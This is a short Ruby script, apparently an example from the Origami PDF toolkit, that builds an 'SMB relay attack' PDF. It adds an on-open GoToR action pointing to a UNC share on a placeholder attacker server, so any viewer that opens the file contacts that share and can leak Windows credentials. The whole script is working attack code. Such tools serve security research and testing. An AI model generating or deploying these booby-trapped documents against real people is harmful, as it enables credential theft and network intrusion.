#!/usr/bin/ruby 

begin
  require 'origami'
rescue LoadError
  ORIGAMIDIR = "#{File.dirname(__FILE__)}/../../../lib"
  $: << ORIGAMIDIR
  require 'origami'
end
include Origami

#
# SMB relay attack.
# Uses a GoToR action to open a shared network directory.
#

ATTACKER_SERVER = "localhost"

pdf = PDF.read(ARGV[0])

dst = ExternalFile.new("\\\\#{ATTACKER_SERVER}\\origami\\owned.pdf")
gotor = Action::GoToR.new(dst, Destination::GlobalFit.new(0), true)
pdf.pages.first.onOpen(gotor)

pdf.save("#{File.basename($0, '.rb')}.pdf")

